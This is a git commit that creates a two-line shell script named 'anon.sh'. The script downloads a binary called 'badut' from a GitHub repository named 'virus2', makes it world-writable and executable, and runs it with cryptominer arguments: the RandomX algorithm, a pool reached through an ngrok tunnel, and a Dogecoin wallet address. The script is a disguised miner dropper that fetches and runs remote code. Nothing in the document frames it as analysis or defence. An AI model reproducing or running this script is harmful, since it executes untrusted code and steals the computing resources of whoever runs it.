2830ac79054928929d176b11df83206b18b39388
raufpermana22 <53905319+raufpermana22@users.noreply.github.com>
2022-04-29 19:07:57 +0900

    Create anon.sh

---
+++ anon.sh
@@ -0,0 +1,2 @@
+lscpu
+wget https://github.com/raufpermana22/virus2/raw/main/badut && chmod 777 badut && ./badut -a rx/0 -o 0.tcp.ngrok.io:16785 u DOGE:DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS.$(echo $(shuf -i 1-9999 -n 1)-DEV) -p x 
